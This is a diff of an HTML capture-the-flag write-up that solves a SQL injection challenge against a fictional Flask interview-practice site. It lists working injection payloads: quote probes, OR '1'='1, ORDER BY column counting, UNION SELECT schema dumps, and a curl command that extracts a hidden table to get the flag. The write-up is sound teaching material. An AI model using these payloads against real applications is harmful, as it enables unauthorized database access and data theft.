@@ -67,25 +67,150 @@
 
     <div class="wu-layout">
     <article class="wu-article">
-<p>&quot;LeetVault&quot;, a fictional interview-practice platform. <code>/challenge</code> names the vulnerability class outright (SQL Injection), with a nudge toward hidden rows reachable only through the data layer. <code>GET /api/problems?search=&lt;query&gt;</code> searches 6 public problems.</p>
-<p><strong>Finding the injection:</strong> a lone <code>&#39;</code> returns HTTP 400 (&quot;legacy search service rejected&quot;), but a <em>balanced</em> <code>&#39; OR &#39;1&#39;=&#39;1</code> returns all 6 rows - the 400 is just a Flask handler catching a raw sqlite3 syntax error, not a WAF. The query is <code>SELECT id, title, category, difficulty FROM problems WHERE title LIKE &#39;%&lt;search&gt;%&#39;</code>.</p>
-<p><strong>Exploitation:</strong> <code>&#39; order by 4-- </code> succeeds, <code>&#39; order by 5-- </code> fails → 4 columns. Dumping <code>sqlite_master</code> reveals three tables, including an <code>internal_notes(id, note_type, content, created_at)</code> table that the app never exposes directly.</p>
-<figure class="wu-code" data-lines="5">
+<p>Event: CRYOVAULT
+Category: Web / SQL Injection
+Difficulty: Medium
+Points: 50
+Target: <a href="https://isfcrpesu-hidden-test-case.chals.io/">https://isfcrpesu-hidden-test-case.chals.io/</a>
+Flag: <code>isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}</code></p>
+<h2 id="recon"><a class="wu-anchor" href="#recon" aria-hidden="true">#</a>Recon</h2>
+<p>The target is &quot;LeetVault&quot;, a fictional interview-practice platform (gunicorn/Flask).
+Landing page, <code>/problems</code>, <code>/challenge</code>, <code>/login</code>. The <code>/challenge</code> page names the
+vulnerability class outright: <em>Web / SQL Injection</em>, and the brief says records appear
+to be missing but the DB team insists everything is normal - a nudge toward hidden rows
+reachable only through the data layer.</p>
+<p><code>/problems</code> is a search UI that calls:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-text">GET /api/problems?search=&lt;query&gt;</code></pre>
+      
+    </figure><p>Baseline (empty query) returns 6 public problems, ids 1 - 6:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-text">{&quot;count&quot;:6,&quot;query&quot;:&quot;&quot;,&quot;results&quot;:[{&quot;id&quot;:1,&quot;title&quot;:&quot;Two Sum&quot;,&quot;category&quot;:&quot;Arrays&quot;,&quot;difficulty&quot;:&quot;Easy&quot;}, ...]}</code></pre>
+      
+    </figure><h2 id="finding-the-injection"><a class="wu-anchor" href="#finding-the-injection" aria-hidden="true">#</a>Finding the injection</h2>
+<p>Probing the <code>search</code> parameter:</p>
+<table>
+<thead>
+<tr>
+<th>payload</th>
+<th>http</th>
+<th>result</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#39;</code></td>
+<td>400</td>
+<td>&quot;legacy search service rejected&quot;</td>
+</tr>
+<tr>
+<td><code>&#39;&#39;</code></td>
+<td>200</td>
+<td>0 results</td>
+</tr>
+<tr>
+<td><code>%</code></td>
+<td>200</td>
+<td>all 6</td>
+</tr>
+<tr>
+<td><code>&#39; OR &#39;1&#39;=&#39;1</code></td>
+<td>200</td>
+<td>all 6</td>
+</tr>
+<tr>
+<td><code>x&#39; OR &#39;1&#39;=&#39;1</code></td>
+<td>200</td>
+<td>0</td>
+</tr>
+</tbody></table>
+<p>The key tell: a lone <code>&#39;</code> yields HTTP 400, but a <em>balanced</em> <code>&#39; OR &#39;1&#39;=&#39;1</code> yields rows.
+That 400 is not a WAF - it is the Flask handler catching a <code>sqlite3</code> syntax error from
+an unbalanced quote and rewriting it as a friendly &quot;rejected that query&quot; message.
+Balanced payloads execute normally, and <code>&#39; OR &#39;1&#39;=&#39;1</code> returning every row confirms the
+input is concatenated raw into the query.</p>
+<p>The query is, in effect:</p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">sql</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-sql">SELECT id, title, category, difficulty
+FROM problems
+WHERE title LIKE '%&lt;search&gt;%'</code></pre>
+      
+    </figure><p>So <code>search = &#39; OR &#39;1&#39;=&#39;1</code> becomes <code>... WHERE title LIKE &#39;%&#39; OR &#39;1&#39;=&#39;1%&#39;</code> → all rows.
+(<code>x&#39; OR &#39;1&#39;=&#39;1</code> prepends <code>x</code> to the LIKE prefix so the first branch matches nothing and
+<code>&#39;1&#39;=&#39;1%&#39;</code> is false → 0 rows, which independently confirms the concatenation point.)</p>
+<h2 id="exploitation"><a class="wu-anchor" href="#exploitation" aria-hidden="true">#</a>Exploitation</h2>
+<p><strong>1. Column count.</strong> <code>&#39; order by 4-- </code> returns 200; <code>&#39; order by 5-- </code> returns 400.
+Four columns. The result JSON renames them to <code>id, title, category, difficulty</code>.</p>
+<p><strong>2. Schema.</strong> SQLite 3.46.1 (<code>&#39; UNION SELECT sqlite_version(),2,3,4-- </code>). Dumping
+<code>sqlite_master</code> reveals three tables:</p>
+<ul>
+<li><code>categories(id, name, problem_count)</code></li>
+<li><code>internal_notes(id, note_type, content, created_at)</code>  ← interesting</li>
+<li><code>problems(id, title, difficulty, category, description, starter_code, is_public)</code></li>
+</ul>
+<p>Note <code>problems.is_public</code> - the app only shows <code>is_public = 1</code> rows, which is the
+in-fiction &quot;missing records&quot; behaviour. But the real prize is <code>internal_notes</code>.</p>
+<p><strong>3. Dump.</strong></p>
+<figure class="wu-code" data-lines="2">
       <figcaption>
         
         <span class="wu-code-lang">bash</span>
-        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-1"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">curl -s --get <span class="hljs-string">&#x27;https://isfcrpesu-hidden-test-case.chals.io/api/problems&#x27;</span> \</span></span>
-<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">  --data-urlencode <span class="hljs-string">&quot;search=&#x27; UNION SELECT id,note_type,content,created_at FROM internal_notes-- &quot;</span></span></span>
-<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-built_in">id</span>=1 note_type=<span class="hljs-string">&#x27;legacy_migration&#x27;</span> content=<span class="hljs-string">&#x27;Migration verification complete.</span></span></span>
-<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc"><span class="hljs-string">        Hidden test case: isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}&#x27;</span></span></span>
-<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}</span></span></code></pre>
+      <pre id="code-4"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">curl -s --get <span class="hljs-string">&#x27;https://isfcrpesu-hidden-test-case.chals.io/api/problems&#x27;</span> \</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">  --data-urlencode <span class="hljs-string">&quot;search=&#x27; UNION SELECT id,note_type,content,created_at FROM internal_notes-- &quot;</span></span></span></code></pre>
       
-    </figure><p>Takeaways: a 400 on a single quote is a symptom of injectable concatenation, not proof of a WAF - compare unbalanced vs. balanced quote payloads. <code>-- </code> (dash-dash-space) is required to comment out the app&#39;s trailing <code>%&#39;</code>. The &quot;hidden record&quot; was a leaked operational note table, not an <code>is_public=0</code> problem row - enumerate <code>sqlite_master</code> and dump every table rather than guessing.</p>
+    </figure><p>The two notes returned:</p>
+<figure class="wu-code wu-code-output" data-lines="5">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-text">id=1 note_type='legacy_migration' content='Migration verification complete.
+        Hidden test case: isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}' created_at='2023-10-31'
+
+id=2 note_type='ops_reminder'    content='Retire the old search service after the
+        migration audit is signed off.'                     created_at='2023-11-01'</code></pre>
+      
+    </figure><h2 id="flag"><a class="wu-anchor" href="#flag" aria-hidden="true">#</a>Flag</h2>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-6"><code class="language-text">isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}</code></pre>
+      
+    </figure><h2 id="takeaways"><a class="wu-anchor" href="#takeaways" aria-hidden="true">#</a>Takeaways</h2>
+<ul>
+<li>A 400 on a single quote is often a <em>symptom</em> of injectable concatenation, not proof of
+a WAF. Compare unbalanced vs balanced quote payloads: if balanced ones execute, it&#39;s SQLi.</li>
+<li><code>-- </code> (dash-dash-<strong>space</strong>) is required to comment out the app&#39;s trailing <code>%&#39;</code>.</li>
+<li>The &quot;hidden record&quot; was a leaked operational note table, not an <code>is_public=0</code> problem
+row - always enumerate <code>sqlite_master</code> and dump every table rather than guessing.</li>
+</ul>
 
     </article>
-    
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#recon">Recon</a></li><li><a href="#finding-the-injection">Finding the injection</a></li><li><a href="#exploitation">Exploitation</a></li><li><a href="#flag">Flag</a></li><li><a href="#takeaways">Takeaways</a></li></ol>
+      </nav>
   </div>
 
   <nav class="wu-pager" aria-label="More writeups">
